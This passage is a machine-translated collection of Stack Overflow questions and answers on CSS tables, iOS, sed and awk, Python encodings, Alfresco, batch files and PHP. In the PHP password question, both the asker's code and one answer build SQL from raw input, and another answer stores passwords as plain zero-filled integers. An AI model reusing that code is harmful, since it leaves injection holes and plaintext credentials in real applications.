            <img src="http://cdn2.iconfinder.com/data/icons/splashyIcons/arrow_large_right.png" width="16" height="16" title="Right" alt="Arrow right" style="display:inline-block;padding:3px;background:#A9DBF5;" />
        </td>
    </tr>
    <tr>
        <td align="center" width="100%" height="20" colspan="3" bgcolor="#A9DBF5">
            <img src="http://cdn2.iconfinder.com/data/icons/splashyIcons/arrow_large_down.png" width="16" height="16" title="Down" alt="Arrow down" style="display:inline-block;" />
        </td>
    </tr>
</table> 
```

如您所见，我没有使用空`<td>`的 s ，而是将其中一个参数放在那里，`colspan="3"`并将一个 td 完全分布在三列上。

这是一个演示：[jsbin LINK](http://jsbin.com/itosow/1/)

请注意，我没有像您那样使用`border-radius`和`border`css 来保持代码尽可能短，因此您可以理解。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2014-06-17T13:56:59.950

另一个技巧是使用`:after`伪元素：

```
td.empty:after {
  content: 'Empty cell';
  visibility: hidden;
  speak: none;
} 
```

这应该适用于任何浏览器（在 Windows 7 上的 Chrome 中测试）并为您节省很多`&nbsp;`并将更好的演示与逻辑分开。

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2012-09-14T10:59:26.960

没有这样的事情`height: 100%.`

一个元素永远不能仅仅通过传递来填充它的父级高度`height: 100%`，添加的解决方案`&nbsp;`或者`table {empty-cells: show;}`应该做的伎俩，但是没有一个特定的高度你永远不会得到想要的效果。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-09-14T12:33:25.297

可以在您的解决方案中使用 jQuery 吗？如果是这样，您可以将以下内容放入一个函数中并在加载时调用它，并且每当表调整大小时（如果它调整大小）

```
$('.ghost.column table').height($('.ghost.column').height()) 
```

我还想知道使用表格是否是实现您目标的最佳方法？这是有原因的，还是可以尝试使用`<div>`元素？

工作演示：http: [//jsfiddle.net/X3YAu/14/](http://jsfiddle.net/X3YAu/14/)

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-05-28T17:22:54.783

[我在另一个线程](https://stackoverflow.com/questions/3966027/make-link-in-table-cell-fill-the-entire-row-height)中找到了这个答案并且它有效。这种方式不需要为空白单元格放置额外的空格。

```
td a {
  display: inline-block;
  height:100%;
  width:100%;
} 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-08-31T10:18:50.387

最好的方法是使用 CSS 方式。

```
table { empty-cells: show; } 
```

方法是一个好方法，`&nbsp;`但它有点黑客。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2016-03-28T15:05:34.933

您只需要：

```
table { empty-cells: show; 
min-width: 130px; //example.
} 
```

就是这样，它对我有用

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2021-03-02T16:38:07.247

**保持空单元格高度 100%**

对于`<th>`和`<td>`：

```
th:empty::before,td:empty::before{content:'\00a0';visibility:hidden} 
```

仅适用`<td>`于：

```
td:empty::before{content:'\00a0';visibility:hidden} 
```

描述：

`'\00a0'`是单个空格的代码

`visibility:hidden`隐藏那个单一的空间

# iphone - 如何将输入作为字符从键盘输入到 uitextfield

> ID：12213161
> 
> 赞同：1
> 
> 时间：2012-08-31T10:04:04.033
> 
> 标签：iphone, ios, uikeyboard

我正在做一个自定义键盘，但我不知道如何在 uitextfield 中显示它。我怎样才能做到这一点 ？（我使用 UIView 作为我的键盘并在文件 nib 中进行设计。）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T10:25:30.957

你需要写这个；-

```
*yourtextfieldname*.inputView=*yourcustomkeyboardviewname*; 
```

来自 Apple Docs：-

输入视图

当文本字段成为第一响应者时显示的自定义输入视图。

@property（读写，保留） UIView *inputView

讨论 如果此属性中的值为 nil，则文本字段在成为第一响应者时显示标准系统键盘。将自定义视图分配给此属性会导致显示该视图。

此属性的默认值为 nil。

[http://developer.apple.com/library/ios/#documentation/uikit/reference/UITextField_Class/Reference/UITextField.html](http://developer.apple.com/library/ios/#documentation/uikit/reference/UITextField_Class/Reference/UITextField.html)

# regex - sed 以某种方式写一行

> ID：12213163
> 
> 赞同：0
> 
> 时间：2012-08-31T10:04:10.313
> 
> 标签：regex, windows, sed

我有这个文本文件，其中包含以某种格式制作的行，就像下一行一样

```
bla bla name1=WORD1 bla    bla name2=WORD2 bla bla name3=WORD2 
```

我想提取没有所有 bla bla 的 WORD1 WORD2 WORD3 并用分号打印它们

```
WORD1;WORD2;WORD3 
```

这可以只使用 sed 来完成吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T11:13:12.247

一种处理不同`key=value`字符串的方法。

假设`infile`内容：

```
bla bla name1=WORD1 bla   noname=WORD4 bla name2=WORD2 bla bla name3=WORD3 
```

`script.sed`内容：

```
## Add a newline character just before each word.
s/name[1-3]=\([^ ]*\)/\n\1/g;

## Remove all characters until each newline appended in previous command, so only
## words will be left, and insert a ';' between them.
s/[^\n]*\n\([^ ]*\)/\1;/g;

## Remove last ';'.
s/;[ ]*$//; 
```

像这样运行它：

```
sed -f script.sed infile 
```

这会产生：

```
WORD1;WORD2;WORD3 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-31T10:14:45.887

如果`WORD*`总是以这种方式出现，你可以使用这两种模式`[^=]*=`来`[^ ]*`分别匹配before和word。`^`在组的开头反转匹配。这样的东西在 GNU sed 中有效：

```
sed -r 's/[^=]*=([^ ]*)[^=]*=([^ ]*)[^=]*=(.*)/\1;\2;\3/' infile 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-31T10:15:22.237

如果你对 awk 感兴趣，下面会起作用。

```
awk '{for(i=1;i<=NF;i++){if($i~/\=/){split($i,a,"=");if(p){p=p";"a[2]}else{p=a[2]}}}}END{print p}' 
```

测试如下：

```
> echo "bla bla name1=WORD1 bla    bla name2=WORD2 bla bla name3=WORD2" | awk '{for(i=1;i<=NF;i++){if($i~/\=/){split($i,a,"=");if(p){p=p";"a[2]}else{p=a[2]}}}}END{print p}'
WORD1;WORD2;WORD2
> 
```

# iphone - 使用选择器方法调用C函数并在iPhone中的c方法中访问self

> ID：12213166
> 
> 赞同：2
> 
> 时间：2012-08-31T10:04:15.047
> 
> 标签：iphone, c, ios5, selector

我在 C 函数中实现了一些东西，我想使用 NSTimer 方法调用另一个 c 方法，但选择器不起作用，也没有调用 self 方法。怎么能这样做？

```
 [NSTimer scheduledTimerWithTimeInterval:900 target:self selector:@selector(prepareToUploadLog()) userInfo:nil repeats:YES]; 
```

void prepareToUploadLog(void) 是另一个函数

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T10:14:19.553

根据以下文件[`scheduledTimerWithTimeInterval`](https://developer.apple.com/library/mac/documentation/Cocoa/Reference/Foundation/Classes/NSTimer_Class/Reference/NSTimer.html#//apple_ref/occ/clm/NSTimer/scheduledTimerWithTimeInterval%3atarget%3aselector%3auserInfo%3arepeats%3a)：

> **aSelector：**定时器触发时发送给目标的消息。选择器**必须对应于**返回 void 并采用单个参数的方法。计时器将自己作为参数传递给此方法。

因此，您不能使用 C 函数，而必须添加一个包装 C 函数的 Objective C 方法。

```
- (void)prepareToUpload
{
    prepareToUploadLog();
} 
```

# piping - 不传输 EOT 的管道

> ID：12213169
> 
> 赞同：0
> 
> 时间：2012-08-31T10:04:23.740
> 
> 标签：piping

我正在寻找一种不发送 EOT (Ctrl-D) 的管道方式，即使这些等效：

```
bob@bob-pc:~$ cat
porkchop
porkchop 
```

和

```
bob@bob-pc:~$ echo -n pork | cat
porkbob@bob-pc:~$ chop
No command 'chop' found 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T18:15:24.633

我在某种程度上解决了这个问题：

```
bob@bob-pc:~$ ( echo -n pork ; while read l; do echo $l; done ) |cat
porkchop
chop 
```

但是一个不那么乏味的解决方案仍然很好。

# java - 连接池登录tomcat

> ID：12213176
> 
> 赞同：1
> 
> 时间：2012-08-31T10:04:37.327
> 
> 标签：java, servlets, connection-pooling

我是连接池的新手，想在访问数据库之前和之后获取连接池的日志。

我已经使用 tomcat 创建了一个连接池。有什么办法可以看到连接池的状态，即。在访问数据库之前，在访问数据库之间和关闭连接池之后没有可用的连接？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T10:12:31.340

tomcat 中没有内置功能来执行此操作。您可以通过安装 java-monitor ( [http://java-monitor.com/forum/install.php](http://java-monitor.com/forum/install.php) ) 来获得此功能。

这是您可以看到的东西的现场演示[http://java-monitor.com/forum/livedemo.php](http://java-monitor.com/forum/livedemo.php)

# php - 删除php包时出错

> ID：12213177
> 
> 赞同：-2
> 
> 时间：2012-08-31T10:04:39.057
> 
> 标签：php, linux, installation, dpkg

我怎样才能摆脱这个错误？

```
root@excel2012:~# sudo apt-get remove php5-imagick

Reading package lists... Done

Building dependency tree... Done

The following packages will be REMOVED:

  php5-imagick

0 upgraded, 0 newly installed, 1 to remove and 43 not upgraded.

7 not fully installed or removed.

After this operation, 426 kB disk space will be freed.

Do you want to continue [Y/n]? y

(Reading database ... 25121 files and directories currently installed.)

Removing php5-imagick ...

sed: can't read /etc/php5/conf.d/imagick.ini: No such file or directory

dpkg: error processing php5-imagick (--remove):

 subprocess installed post-removal script returned error exit status 2

configured to not write apport reports
                                      Errors were encountered while processing:
 php5-imagick

E: Sub-process /usr/bin/dpkg returned an error code (1) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-04T18:08:40.433

编辑 /var/lib/dpkg/info/php5-imagick.postrm 并删除有关 /etc/php5/conf.d/imagick.ini 的行。然后这个包应该可以被删除。请记住根据需要修改/删除 /etc/php5/conf.d/imagick.ini。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-06-12T06:52:52.800

文件 /etc/php5/conf.d/imagick.ini 丢失。要修复：

1.  `sudo touch /etc/php5/conf.d/imagick.ini`
2.  `sudo dpkg --purge --force-all php5-imagick`

# python - Python：追溯 codecs.charmap_decode(input,self.errors,decoding_table)[0]

> ID：12213178
> 
> 赞同：6
> 
> 时间：2012-08-31T10:04:56.917
> 
> 标签：python, file-io, python-3.x, traceback, python-unicode

以下是示例代码，目的只是合并给定文件夹及其子文件夹中的文本文件。我偶尔会得到 Traceback，所以不知道在哪里看。还需要一些帮助来增强代码以防止合并空白行并在合并/主文件中不显示任何行。在合并文件之前，应该执行一些清理或者只是在合并过程中忽略空白行，这可能是个好主意。

文件夹中的文本文件不超过 1000 行，但聚合主文件很容易跨越 10000+ 行。

```
import os
root = 'C:\\Dropbox\\ans7i\\'
files = [(path,f) for path,_,file_list in os.walk(root) for f in file_list]
out_file = open('C:\\Dropbox\\Python\\master.txt','w')
for path,f_name in files:
    in_file = open('%s/%s'%(path,f_name), 'r')

    # write out root/path/to/file (space) file_contents
    for line in in_file:
        out_file.write('%s/%s %s'%(path,f_name,line))
    in_file.close()

    # enter new line after each file
    out_file.write('\n')

with open('master.txt', 'r') as f:
  lines = f.readlines()
with open('master.txt', 'w') as f:
  f.write("".join(L for L in lines if L.strip())) 

Traceback (most recent call last):
  File "C:\Dropbox\Python\master.py", line 9, in <module> for line in in_file:
  File "C:\PYTHON32\LIB\encodings\cp1252.py", line  23, in decode return codecs.charmap_decode(input,self.errors,decoding_table)[0]  
UnicodeDecodeError: 'charmap' codec can't decode byte 0x81 in position 972: character maps to <undefined> 
```

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-08-31T10:21:10.437

引发错误是因为 Python 3 使用与内容不匹配的默认编码打开文件。

如果您所做的只是复制文件内容，则最好使用该[`shutil.copyfileobj()`功能](http://docs.python.org/py3k/library/shutil.html#shutil.copyfileobj)并以二进制模式打开文件。这样你就可以完全避免编码问题（当然，只要你所有的源文件都是*相同的编码*，所以你最终不会得到一个混合编码的目标文件）：

```
import shutil
import os.path

with open('C:\\Dropbox\\Python\\master.txt','wb') as output:
    for path, f_name in files:
        with open(os.path.join(path, f_name), 'rb') as input:
            shutil.copyfileobj(input, output)
        output.write(b'\n') # insert extra newline between files 
```

我已经清理了一些代码以使用上下文管理器（因此您的文件在完成后会自动关闭）并用于`os.path`为您的文件创建完整路径。

如果你确实需要逐行处理你的输入，你需要告诉 Python 期望什么编码，这样它就可以将文件内容解码为 python 字符串对象：

```
open(path, mode, encoding='UTF8') 
```

请注意，这需要您预先了解*文件*使用的编码。

如果您对 python 3、文件和编码有其他疑问，请阅读[Python Unicode HOWTO 。](http://docs.python.org/py3k/howto/unicode.html)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2021-11-08T23:44:29.967

我在使用 os module remove 函数删除文件时遇到了类似的问题。

我执行的所需更改是：

```
file = open(filename) 
```

到

```
file = open(filename, encoding="utf8") 
```

添加一个编码=“utf-8”</p>

UTF-8 是最常用的编码之一，Python 通常默认使用它。UTF 代表“Unicode 转换格式”，“8”表示在编码中使用 8 位值。... UTF-8 使用以下规则：如果代码点 < 128，则由相应的字节值表示。

# components - 如何在我的 Alfresco 表单上添加文件上传选择器

> ID：12213190
> 
> 赞同：1
> 
> 时间：2012-08-31T10:05:42.900
> 
> 标签：components, webclient, alfresco, customizing, alfresco-share

如何在 Alfresco Share 中的表单上添加文件/数据上传选择器？我需要单击我的按钮，然后应该出现文件选择器。有人可以帮忙吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-04T11:00:35.243

查看[users.js](http://sharextras.org/jsdoc/share/community-4.0.d/symbols/src/components_console_users.js.html)中定义的管理用户控制台代码，该代码能够上传包含用户详细信息的 CSV 文件。

首先，您需要定义一个 HTML 按钮控件，然后添加一些客户端脚本以将其绑定到上传控件

在组件的 HTML 模板中定义按钮

```
<span class="yui-button yui-push-button" id="${args.htmlid?html}-uploadusers-button">
   <span class="first-child"><button>${msg("button.uploaduser")}</button></span>
</span> 
```

然后在您的客户端代码中创建 YUI 按钮（例如在您的`onReady()`函数中）

```
var uploadUsersButton = Alfresco.util.createYUIButton(this, "uploadusers-button", this.onUploadUsersClick); 
```

然后将按钮单击处理程序定义为组件原型的新功能 - 以下示例来自您需要根据需要修改的`ConsoleUsers_onUploadUsersClick()`功能`users.js`

```
onUploadUsersClick: function onUploadUsersClick()
{
   // Force the use of the HTML (rather than Flash) uploader because there are issues with the
   // Flash uploader in these circumstances when Sharepoint is being used. The Flash uploader
   // picks up the wrong JSESSIONID cookie which causes the upload to fail.
   if (!this.fileUpload)
   {
      this.fileUpload = Alfresco.util.ComponentManager.findFirst("Alfresco.HtmlUpload") 
   }

   // Show uploader for single file select - override the upload URL to use appropriate upload service
   var uploadConfig =
   {
      uploadURL: "api/people/upload.html",
      mode: this.fileUpload.MODE_SINGLE_UPLOAD,
      onFileUploadComplete:
      {
         fn: this.onUsersUploadComplete,
         scope: this
      }
   };

   this.fileUpload.show(uploadConfig);

   // Make sure the "use Flash" tip is hidden just in case Flash is enabled...
   var singleUploadTip = Dom.get(this.fileUpload.id + "-singleUploadTip-span");
   Dom.addClass(singleUploadTip, "hidden");
   Event.preventDefault(e);
} 
```

注意`uploadURL`配置对象中参数的使用。您应该将其设置为您创建的自定义存储库 Web 脚本的 URL，该脚本知道如何处理上传文件的内容。

用户上传示例还定义了一个`onUsersUploadComplete()`您将看到引用的方法。您可以在此处实现自己的组件方法以采取适当的操作，例如根据上传结果更新 UI。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-31T10:54:56.397

要创建表单，您应该在路径中放置三个文件：

```
/Alfresco/Tomcat/shared/classes/alfresco/site-webscript/org/alfresco/components/dashlets 
```

在那里，你应该有：

```
yourCustomForm.get.desc.xml
yourCustomForm.get.html.ftl
yourCustomForm.get.js 
```

在 XML 中，你应该这样写：

```
<webscript>
<shortname>My Form</shortname>
<description>Form to upload new doc</description>
<family>dashlet</family>
<url>/components/dashlets/yourCustomForm</url>
<authentication>user</authentication>
</webscript> 
```

FTL 文件：

```
<!-- Pre-requisite: flash-upload and html-upload components are also included on the page -->
<#assign fileUploadConfig = config.scoped["DocumentLibrary"]["file-upload"]!>
<#if fileUploadConfig.getChildValue??>
<#assign adobeFlashEnabled = fileUploadConfig.getChildValue("adobe-flash-enabled")!"true">
</#if>
<script type="text/javascript">//<![CDATA[
new Alfresco.getFileUploadInstance().setOptions(
{
adobeFlashEnabled: ${((adobeFlashEnabled!"true") == "true")?string}
});
//]]>
</script> 
```

此文件在 Share 中启用上传表单的 Flash 或 HTML 版本。（它已经存在，代码是名为“file-upload.get*”的文件

```
/Alfresco/Tomcat/webapps/share/classes/alfresco/site-webscript/org/alfresco/components/upload directory 
```

在那里您还可以找到 flash 和 html 默认代码。

JS应该包括文件上传js文件，所以：

```
<#include "../component.head.inc">
<!-- File-Upload -->
<@script type="text/javascript" src="${page.url.context}/res/components/upload/file-upload.js">
</@script> 
```

显然源 file-upload.js 应该有正确的路径，所以如果你在共享目录中工作，你应该把上面提到的文件也复制到那里。

希望有帮助。我指的是 RHEL 5.5 上的 Alfresco 4 Enterprise，我们在其中实现了类似的表单（实际上我们制作了一个创建内容的 dashlet，而不是上传，但它的概念几乎相同。看看这里： [https://forums .alfresco.com/en/viewtopic.php?f=48&t=41486](https://forums.alfresco.com/en/viewtopic.php?f=48&t=41486)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-03T12:53:12.527

要在文档详细信息页面的文档操作块中显示新块，您需要将新组件添加到文档详细信息页面。中`site-data\template-instances\document-details.xml`，添加

```
<component>
         <region-id>document-uploadcustom</region-id>
         <url>/components/documentUploadCustom</url>
</component> 
```

让`/components/documentUploadCustom`成为您的网页脚本网址。

在`templates\org\alfresco\document-details.ftl`中，为新组件添加区域，例如`<@region id="document-uploadcustom" scope="template"/>` 您的代码可能如下：

```
<@region id="document-actions" scope="template"/>
<@region id="document-tags" scope="template"/>
<@region id="document-links" scope="template"/>
<@region id="document-metadata" scope="template"/>
<@region id="document-uploadcustom" scope="template"/>
<@region id="document-permissions" scope="template"/>
<@region id="document-workflows" scope="template"/>
<@region id="document-versions" scope="template"/>
<@region id="document-publishing" scope="template"/> 
```

如何上传文件可以参考`repo-toolbar.js`'s`onFileUpload`和`file-upload.js`.

# excel - 将启用宏的文件更改为带有实际实例的 excel 文件的批处理文件？

> ID：12213200
> 
> 赞同：0
> 
> 时间：2012-08-31T10:06:16.903
> 
> 标签：excel, batch-file

**批处理文件：* *代码

@echo off copy /Y "D:\ExcelTest\temp*.*" "D:\ExcelTest\copied*.xls"

**操作：* *上面的代码将创建一个启用宏的文件，以成功地从源位置到目标的 excel 格式文件，

**问题：* *该excel扩展的原创性不会将其视为Excel文件，每当我们尝试打开文件时，它会弹出未定义的格式并询问是或否或取消，

**期望：* *当我们想要打开一个 excel 文件时，它应该直接打开而不弹出任何窗口，它应该显示为 excel 文件

当我重命名文件时，我将扩展名从 .xlsm 更改为 .xls。当我尝试启动它时，Excel 会弹出一个对话框，提示“您尝试打开的文件的格式与文件扩展名指定的格式不同......”

我怎样才能防止这种情况？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-04T23:25:14.047

错误消息准确地告诉您问题所在。您已将文件扩展名从 .xlsm（启用宏的工作簿）更改为 .xls（常规工作簿，旧版 Excel）。

解决方案：首先不要更改扩展名，Excel 应该可以正常打开文件。

```
copy /y D:\ExcelTest\*.xlsm D:\ExcelTest\copied*.xlsm 
```

# php - 通过ajax将整数转换为字符串

> ID：12213201
> 
> 赞同：0
> 
> 时间：2012-08-31T10:06:18.890
> 
> 标签：php, javascript, ajax

我有以下 ajax 代码来更新我的数据库表中的密码，

```
$.ajax({
    type: 'POST',
    url: root_url + '/services/services.php?method=updatesubpwd',
    data: { 
        'sid': ptcid, 
        'pwd': prtpwd // <-- the $ sign in the parameter name seems unusual, I would avoid it
    },
    //data: "sid=" + ptcid + "&pwd=" + prtpwd,
    async: true,

    success: function (data) {
        alert(prtpwd);
        if ($('.dynapwdblock') && $('.dynapwdblock').css('display')=="none") {
            $('#prepwd').val(prtpwd);
            $('.prtpwd').val(prtpwd);
            $('#prtpwdval').val(prtpwd);

            $('.apfnp').remove();
            $('.dynapwdblock').show(200);
            //alert(data);
        }

    },
    ... 
```

当我在 ajax 的数据中为我的`prtpwd`字段提供值时，一切似乎都运行良好，但是对于数字，当我给出以“0”开头的数字或以“0”系列开头的数字时，第一个 0 不会存储在数据库中这意味着它存储为整数，谁能告诉我应该如何更改函数以接受起始 0 存储在 DB 中

```
 prtpwd=$('#prtpwd').val(); 
```

这是 ajax 从中获取 prtpwd 值的地方。

这是用于将数据设置到数据库中的函数

```
function updateSubPassword($subid, $pwd)
    {
        $query       = "UPDATE Sub SET Sign_pw=".$pwd." WHERE Sub_id=" . $subid;
        $queryresult = mysql_query($query);

        if ($queryresult) {
            return 1;
        } else
            return 0;
    } 
```

尽管数据类型为 Varchar，但前导零并未保存在数据库中

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T10:31:25.487

您可以更改数据库中的列以用零填充它。只需将类型设置`INT`为`Length`最大位数和属性为`UNSIGNED ZEROFILL`.

例子：

```
ALTER TABLE `tablename`
CHANGE `pwdfield` `pwdfield` INT( 8 ) UNSIGNED ZEROFILL NOT NULL 
```

这使您的密码字段最多为 8 位，如果只给出 4 位，则用零填充，即如果您将一个数字`1234`放入数据库，则单元格会将其填充为`00001234`. 这就是它的`UNSIGNED ZEROFILL`用途

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T14:33:13.200

在查询更新密码时，请在 : 周围加上单引号`$pwd`：

```
$query       = "UPDATE Sub SET Sign_pw='$pwd' WHERE Sub_id=$subid"; 
```

这应该强制该值是一个字符串。也可能值得这样做`$subid`。

（另外，你为什么不利用 PHP 双引号符号？）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-31T10:13:11.830

如果您将数据库中的列设置为“整数”，则当您尝试保存到数据库时将获得零。将列类型更改为 varchar 或 text 或类似的东西（取决于您使用的数据库）。还要确保将字符串传递给 ajax 调用，而不是整数。一个简单的方法来做到这一点......

```
var myString = ""
myString = myString + variableIThinkMightBeAnInteger 
```

# windows - 在 for 语句中运行命令会给我与单独运行的命令不同的结果？

> ID：12213202
> 
> 赞同：1
> 
> 时间：2012-08-31T10:06:19.687
> 
> 标签：windows, for-loop, batch-file, cmd

我正在尝试使用批处理文件来查找 .cfg 文件中的特定部分，并将其用作变量。

具体来说，我正在尝试读取 Idapi32.cfg（Borland 配置文件），以找到其中一个别名的路径。

我想不出任何方法可以巧妙地做到这一点，所以我一直在尝试这样做：
- 使用 CMD 的 TYPE 功能将 .cfg 文件作为字符串（它的一行文本）并将此字符串设置为变量
- 获取该变量的前五个字符，并使用 IF string1==string2 查看前五个字符是否是我需要的部分
- 如果不是，将变量重置为相同减去第一个字符并再次检查。

我知道我的循环有效，因为我可以看到它有效，但我不明白为什么我在运行之间得到不同的结果

```
TYPE "C:\programdata\borland shared\bde\idapi32.cfg" 
```

和

```
for /f "usebackq tokens=* delims==" %%a in (`type "c:\programdata\borland shared\bde\idapi32.cfg"`) do (echo %%a) 
```

我希望 echo 与 TYPE 命令结果相同？？还是我错过了什么？

*编辑*
我刚刚添加了 TYPE 和 FOR 的结果，以显示结果的差异

```
C:\>type "C:\programdata\borland shared\bde\idapi32.cfg"
♥   DRIVERS ☺ ♥   PARADOX ☺ ♥   INIT ☺ ♥ ☺ NET DIR ♦ W:\WINFILES ☻ ☻ ☻ ♥   DATAB
ASES ☺ ♥   MS Access Database ☺ ♥   DB OPEN ☺ ♥ ☺ DATABASE NAME ♦  ♥ ☺ USER NAME
 ♦  ♥ ☺ ODBC DSN ♦ MS Access Database ♥ ☺ OPEN MODE ♦ READ/WRITE ♥ ☺ SCHEMA CACH
E SIZE ♦ 8 ♥ ☺ SQLQRYMODE ♦  ♥ ☺ LANGDRIVER ♦  ♥ ☺ SQLPASSTHRU MODE ♦ SHARED AUT
OCOMMIT ♥ ☺ SCHEMA CACHE TIME ♦ -1 ♥ ☺ MAX ROWS ♦ -1 ♥ ☺ BATCH COUNT ♦ 200 ♥ ☺ E
NABLE SCHEMA CACHE ♦ FALSE ♥ ☺ SCHEMA CACHE DIR ♦  ♥ ☺ ENABLE BCD ♦ FALSE ♥ ☺ RO
WSET SIZE ♦ 20 ♥ ☺ BLOBS TO CACHE ♦ 64 ☻ ♥   DB INFO ☺ ♥ ☺ TYPE ♦ Microsoft Acce
ss Driver (*.mdb) ♥ ☺ PATH ♦  ☻ ☻ ♥   Excel Files ☺ ♥   DB OPEN ☺ ♥ ☺ DATABASE N
AME ♦  ♥ ☺ USER NAME ♦  ♥ ☺ ODBC DSN ♦ Excel Files ♥ ☺ OPEN MODE ♦ READ/WRITE ♥
☺ SCHEMA CACHE SIZE ♦ 8 ♥ ☺ SQLQRYMODE ♦  ♥ ☺ LANGDRIVER ♦  ♥ ☺ SQLPASSTHRU MODE
 ♦ SHARED AUTOCOMMIT ♥ ☺ SCHEMA CACHE TIME ♦ -1 ♥ ☺ MAX ROWS ♦ -1 ♥ ☺ BATCH COUN
T ♦ 200 ♥ ☺ ENABLE SCHEMA CACHE ♦ FALSE ♥ ☺ SCHEMA CACHE DIR ♦  ♥ ☺ ENABLE BCD ♦
 FALSE ♥ ☺ ROWSET SIZE ♦ 20 ♥ ☺ BLOBS TO CACHE ♦ 64 ☻ ♥   DB INFO ☺ ♥ ☺ TYPE ♦ M
icrosoft Excel Driver (*.xls) ♥ ☺ PATH ♦  ☻ ☻ ♥   dBASE Files ☺ ♥   DB OPEN ☺ ♥
☺ DATABASE NAME ♦  ♥ ☺ USER NAME ♦  ♥ ☺ ODBC DSN ♦ dBASE Files ♥ ☺ OPEN MODE ♦ R
EAD/WRITE ♥ ☺ SCHEMA CACHE SIZE ♦ 8 ♥ ☺ SQLQRYMODE ♦  ♥ ☺ LANGDRIVER ♦  ♥ ☺ SQLP
ASSTHRU MODE ♦ SHARED AUTOCOMMIT ♥ ☺ SCHEMA CACHE TIME ♦ -1 ♥ ☺ MAX ROWS ♦ -1 ♥
☺ BATCH COUNT ♦ 200 ♥ ☺ ENABLE SCHEMA CACHE ♦ FALSE ♥ ☺ SCHEMA CACHE DIR ♦  ♥ ☺
ENABLE BCD ♦ FALSE ♥ ☺ ROWSET SIZE ♦ 20 ♥ ☺ BLOBS TO CACHE ♦ 64 ☻ ♥   DB INFO ☺
♥ ☺ TYPE ♦ Microsoft dBase Driver (*.dbf) ♥ ☺ PATH ♦  ☻ ☻ ♥   Text Files ☺ ♥   D
B OPEN ☺ ♥ ☺ DATABASE NAME ♦  ♥ ☺ USER NAME ♦  ♥ ☺ ODBC DSN ♦ Text Files ♥ ☺ OPE
N MODE ♦ READ/WRITE ♥ ☺ SCHEMA CACHE SIZE ♦ 8 ♥ ☺ SQLQRYMODE ♦  ♥ ☺ LANGDRIVER ♦
♥ ☺ SQLPASSTHRU MODE ♦ SHARED AUTOCOMMIT ♥ ☺ SCHEMA CACHE TIME ♦ -1 ♥ ☺ MAX ROWS 
♦ -1 ♥ ☺ BATCH COUNT ♦ 200 ♥ ☺ ENABLE SCHEMA CACHE ♦ FALSE ♥ ☺ SCHEMA CACHE DIR 
♦  ♥ ☺ ENABLE BCD ♦ FALSE ♥ ☺ ROWSET SIZE ♦ 20 ♥ ☺ BLOBS TO CACHE ♦ 64 ☻ ♥ DB IN
FO ☺ ♥ ☺ TYPE ♦ Microsoft Text Driver (*.txt; *.csv) ♥ ☺ PATH ♦  ☻ ☻ ♥   MS Acce
ss 97 Database ☺ ♥   DB OPEN ☺ ♥ ☺ DATABASE NAME ♦  ♥ ☺ USER NAME ♦  ♥ ☺ ODBC DS
N ♦ MS Access 97 Database ♥ ☺ OPEN MODE ♦ READ/WRITE ♥ ☺ SCHEMA CACHE SIZE ♦ 8 ♥
 ☺ SQLQRYMODE ♦  ♥ ☺ LANGDRIVER ♦  ♥ ☺ SQLPASSTHRU MODE ♦ SHARED AUTOCOMMIT ♥ ☺ 
SCHEMA CACHE TIME ♦ -1 ♥ ☺ MAX ROWS ♦ -1 ♥ ☺ BATCH COUNT ♦ 200 ♥ ☺ ENABLE SCHEMA
 CACHE ♦ FALSE ♥ ☺ SCHEMA CACHE DIR ♦  ♥ ☺ ENABLE BCD ♦ FALSE ♥ ☺ ROWSET SIZE ♦ 
20 ♥ ☺ BLOBS TO CACHE ♦ 64 ☻ ♥   DB INFO ☺ ♥ ☺ TYPE ♦ Microsoft Access Driver (*
.mdb) ♥ ☺ PATH ♦  ☻ ☻ ♥   NewSites ☺ ♥   DB INFO ☺ ♥ ☺ TYPE ♦ STANDARD ♥ ☺ PATH 
♦ C:\welcome\progs\sitesdatasetups\hoste\book ♥ ☺ ENABLE BCD ♦ FALSE ♥ ☺ DEFAULT
 DRIVER ♦ PARADOX ☻ ☻ ♥   WinPOS32DB ☺ ♥   DB INFO ☺ ♥ ☺ TYPE ♦ STANDARD ♥ ☺ PAT
H ♦ C:\TaskPOS\WINPOS~1\ ♥ ☺ ENABLE BCD ♦ FALSE ♥ ☺ DEFAULT DRIVER ♦ Paradox ☻ ☻
 ♥   PreparationDB ☺ ♥   DB INFO ☺ ♥ ☺ TYPE ♦ STANDARD ♥ ☺ PATH ♦ C:\TaskPOS\Win
POS32DB ♥ ☺ ENABLE BCD ♦ FALSE ♥ ☺ DEFAULT DRIVER ♦ PARADOX ☻ ☻ ♥   IOLiteW21125
25165259313 ☺ ♥   DB INFO ☺ ♥ ☺ TYPE ♦ STANDARD ♥ ☺ PATH ♦ W:\Book ♥ ☺ ENAB 
```

它继续...

```
C:\>for /f "usebackq tokens=* delims==" %a in (`type "c:\programdata\borland sha
red\bde\idapi32.cfg"`) do (echo %a)

C:\>(echo ♥SQLQRYMODE♦IOLiteW2112525165259313☻ )
♥SQLQRYMODE♦IOLiteW2112525165259313☻ 
```

